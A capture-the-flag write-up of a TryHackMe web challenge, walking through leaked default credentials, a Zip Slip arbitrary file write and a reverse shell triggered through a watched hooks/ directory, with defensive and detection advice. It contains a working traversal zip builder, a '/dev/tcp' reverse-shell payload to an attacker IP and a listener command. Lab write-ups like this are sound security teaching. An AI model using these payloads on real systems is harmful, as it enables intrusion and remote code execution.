## CTF Writeup — "The Hollow Shell" Zip Slip → Hook RCE (TryHackMe)
### TryHackMe · Hacker Holidays · Web · Medium (90 pts) · Zip Slip arbitrary write into a watched hooks/ dir → reverse shell

**Flag:** `THM{REDACTED}`

---

## TL;DR

A staff portal lets you upload a `.zip` "shell pack." The extractor **doesn't
sanitize file paths inside the zip** — a classic **Zip Slip**, so a zip entry
named `../../hooks/rev.sh` escapes the upload directory and writes wherever you
point it. The portal's own note gives away the trigger: a background **"theme
worker" applies automation hooks** shortly after upload. Zip Slip a reverse-shell
script into the app's `hooks/` directory, wait for the worker to run it, and catch
the shell — then read the flag.

---

## The attack chain

```
Login (creds leaked in an HTML comment)
        │
        ▼
Upload feature takes a .zip "shell pack" (manifest + assets)
        │
        ▼
Extractor writes zip entries WITHOUT path sanitization  →  Zip Slip (arbitrary write)
        │  proven: ../ = shells/ , ../../ = app root , ../../static/ = web-served
        ▼
Portal note: a "theme worker" applies automation HOOKS shortly after upload
        │
        ▼
Zip Slip a reverse-shell into ../../hooks/  →  worker executes it
        │
        ▼
Shell as the app user  →  read the flag  →  FLAG
```

Maps to the briefing: "upload a shell… the shell answers with a shell of your own"
(seashell → reverse shell), "slip past what the portal forgets to check" (no path
sanitization on extract), "automation hooks the theme worker applies" (the
execution trigger).

---

## Background: Zip Slip

**Zip Slip** is a path-traversal vulnerability in archive extraction. A zip file
stores each entry by name — and those names can be *paths*, including `../`
sequences. A safe extractor takes each entry and writes it **inside** the intended
output folder, rejecting or normalizing anything that would escape. A **naive**
extractor trusts the stored name blindly, so an entry named
`../../../../etc/cron.d/evil` gets written by climbing out of the output folder to
wherever the path leads.

That turns "upload an archive" into "write a file anywhere the web process can" —
and if you can write to a location that later gets **executed** (a cron dir, a
startup file, a directory a worker process watches), arbitrary write becomes
**remote code execution**.

## Scope note

THM-provisioned target, worked from the THM attackbox inside their network.

## Step 1 — Recon and login

The site (Flask on gunicorn, port 5000) redirects to `/login`. The login page's
HTML source contains a **comment with default credentials**:

```html
<!-- IT seeds every property with the same starter login:
     user: concierge / pass: StayNoticed2024! -->
```

Log in and keep the session cookie:

```bash
curl -s -i -c cookie.txt -X POST http://$IP:5000/login \
  -d 'username=concierge&password=StayNoticed2024!'
```

The dashboard is the **"Shoreline Display" portal**: upload a `.zip` "shell" (a
manifest `shell.json` plus assets), and a note mentions that **"a theme worker
applies automation hooks shortly after the shell comes ashore."** That sentence is
the whole hint — remember it.

## Step 2 — Confirm arbitrary write (the "allowed types" filter is fake)

Upload a minimal valid shell (`shell.json` + a `.css`), then add a file whose
extension is **not** on the allowed list (`png jpg gif svg css json`) — e.g.
`sneaky.py`. Fetch it from the extraction path:

```bash
curl -s -i http://$IP:5000/shells/<id>/sneaky.py     # → 200, our content
```

It's served. **The allowed-types filter is cosmetic** — the extractor writes every
file in the zip. That's "what the portal forgets to check," part one.

## Step 3 — Confirm Zip Slip and map the paths

Craft a zip with traversal entries at several depths and see which land in
web-readable locations:

```python
import zipfile
z = zipfile.ZipFile("/tmp/multi.zip","w")
z.write("shell.json"); z.write("ok.css")
for i in range(1,6):
    z.writestr("../"*i + f"slipmarker/depth{i}.txt", f"depth {i}")
    z.writestr("../"*i + f"static/smark{i}.txt", f"static {i}")
z.close()
```

Upload, then fetch the candidates. The hits map the filesystem:

- `shells/slipmarker/depth1.txt` → **200**  ⇒ `../` from `shells/<id>/` = `shells/`
- `static/smark2.txt` → **200**  ⇒ `../../` = **app root**, and `static/` sits there

So: uploads extract to `<approot>/shells/<id>/`; `../../` reaches the app root.
**Zip Slip is confirmed** — we can write anywhere with the right depth.

## Step 4 — Find the execution trigger: the hooks/ directory

Arbitrary *write* only becomes RCE at a location that gets *executed*. Flask
static files don't auto-execute, overwriting `.py`/templates didn't fire (no
`--reload`), and guessing hook filenames *inside the shell folder* did nothing.

The portal note is explicit, though: a **"theme worker" applies automation
hooks.** The worker watches a dedicated **`hooks/`** directory at the app root —
so Zip Slip a payload *up into* `../../hooks/`, and the worker executes it.

```python
import zipfile
z = zipfile.ZipFile("/tmp/hk.zip","w")
z.write("shell.json"); z.write("a.css")

rev = "#!/bin/bash\nbash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1\n"
# spray hooks/ at a few depths and names to cover the worker's expected path
for d in ["../../hooks/","../hooks/","../../../hooks/","hooks/"]:
    for n in ["hook.sh","apply.sh","run.sh","theme.sh"]:
        z.writestr(d+n, rev)
z.close()
```

Start a listener, upload, and wait for the async worker ("shortly after"):

```bash
nc -lvnp 4444                                                   # attacker box
curl -s -b cookie.txt -F "shell=@/tmp/hk.zip" http://$IP:5000/upload -o /dev/null -L
# watch the listener ~90s — the worker runs the hook and connects back
```

The worker executes the hook and a **reverse shell** connects back.

## Step 5 — Read the flag

In the shell:

```bash
id
find / -name '*flag*' 2>/dev/null
cat /home/*/flag.txt /app/flag.txt /root/flag.txt 2>/dev/null
```

```
THM{REDACTED}
```

---

## Root cause

- **No path sanitization on archive extraction** — the extractor honoured `../`
  in zip entry names, allowing writes outside the upload directory (Zip Slip).
- **A cosmetic file-type filter** — the "allowed asset types" list was advisory;
  every file in the zip was written regardless.
- **A privileged worker executing attacker-writable files** — the "theme worker"
  ran scripts from a `hooks/` directory that the upload could write into.

## Defensive takeaways

- **Sanitize extraction paths.** Resolve each entry to an absolute path and verify
  it stays within the intended output directory before writing
  (`os.path.realpath(dest).startswith(realpath(base))`). Reject entries containing
  `..` or absolute paths. Use a library/API that does this by default.
- **Enforce the allow-list on extraction, not just in the UI** — drop any file
  whose type/extension isn't permitted, by content inspection.
- **Never execute files from an upload-writable location.** If a worker applies
  "hooks," those hooks must come from a trusted, non-writable source, and run with
  least privilege — not as the app/root user.
- **Isolate the worker** (separate user, container, seccomp) so even a malicious
  hook can't reach the flag/host.

## Detection opportunities

- **Extraction writing outside the upload dir** — auditd on `open`/`create` where
  the path escapes the expected uploads directory is a direct Zip Slip signature.
- **New/modified files in a `hooks/` (or cron/startup) directory** immediately
  after an upload request — correlate the upload log line with a file-create event.
- **The web/worker process spawning `bash`/`sh`** — `gunicorn`/worker →
  `bash -i` is a high-signal parent-child anomaly.
- **Outbound TCP from the worker to an odd port** (reverse-shell egress),
  independent of the app logic.

## Command cheat-sheet

```
# login (creds from HTML comment)
curl -s -i -c cookie.txt -X POST http://$IP:5000/login -d 'username=concierge&password=StayNoticed2024!'

# prove arbitrary write: upload a zip with a disallowed file, then fetch it
curl -s -i http://$IP:5000/shells/<id>/sneaky.py

# map Zip Slip depths (upload a multi-depth traversal zip, fetch the markers)
#   ../ = shells/ , ../../ = app root , ../../static/ = web-served

# RCE: zip-slip a reverse shell into the watched hooks/ dir
#   zip entry name: ../../hooks/hook.sh   (payload: bash -i >& /dev/tcp/IP/4444 0>&1)
nc -lvnp 4444
curl -s -b cookie.txt -F "shell=@/tmp/hk.zip" http://$IP:5000/upload -o /dev/null -L
# wait ~90s for the theme worker, catch the shell, read the flag
```

## Two things worth remembering

1. **Read the app's own hints for the execution trigger.** The portal said a
   "theme worker applies automation **hooks**" — the winning Zip Slip target was a
   `hooks/` directory at the app root, not a file inside the upload folder or a
   template. When arbitrary write is confirmed, the question is *what path gets
   executed*, and the application often tells you where to look.
2. **Zip Slip is only as good as your target.** Arbitrary file write is not RCE by
   itself — it becomes RCE at a location something *runs*: a cron dir, a startup
   file, or (here) a worker-watched hooks directory. Match the write target to the
   stack's execution model (a `.php` webroot on Apache, a hooks/cron dir on a
   worker-driven app).

*Target and credentials are fictional challenge material; all actions performed
against the THM-provisioned machine from the THM attackbox.*
